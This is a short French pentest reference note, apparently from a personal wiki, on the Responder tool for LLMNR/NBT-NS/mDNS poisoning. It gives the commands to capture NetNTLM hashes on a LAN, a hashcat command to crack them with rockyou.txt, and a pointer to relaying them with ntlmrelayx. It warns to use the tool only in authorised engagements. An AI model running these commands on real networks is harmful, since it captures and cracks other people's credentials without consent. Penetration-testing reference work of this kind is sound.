---
titre: "Responder"
tags: [Outils, AD, windows, LLMNR, poisoning]
source: https://github.com/lgandx/Responder
---

# Responder

**Empoisonnement LLMNR / NBT-NS / mDNS.** Sur un réseau Windows, quand une machine
cherche un nom qui n'existe pas (faute de frappe, partage disparu), Responder
répond « c'est moi » et **capture l'authentification NetNTLM** de la victime.

> ⚠️ Affecte un vrai réseau : uniquement en engagement/lab autorisé. Cf. `README`.

## Installation
```bash
sudo apt install responder     # Kali : déjà présent
# sources : git clone https://github.com/lgandx/Responder
```

## Utilisation
```bash
sudo responder -I eth0                 # écoute + empoisonne (interface du LAN)
sudo responder -I eth0 -wv             # + serveur WPAD, verbeux
# les hashes capturés sont logués dans /usr/share/responder/logs/
```

## Après capture
```bash
# NetNTLMv2 -> Hashcat
hashcat -m 5600 hash.txt rockyou.txt
```
Alternative offensive : couper l'analyse et **relayer** le hash avec
`ntlmrelayx.py` ([[Impacket]]) vers une cible SMB sans SMB signing.

## Réflexe
Passer d'abord en **analyse** (`-A`) pour observer sans empoisonner. Les
NetNTLMv2 ne sont pas rejouables tels quels → **cracker** ([[Hashcat]] -m 5600)
ou **relayer**.
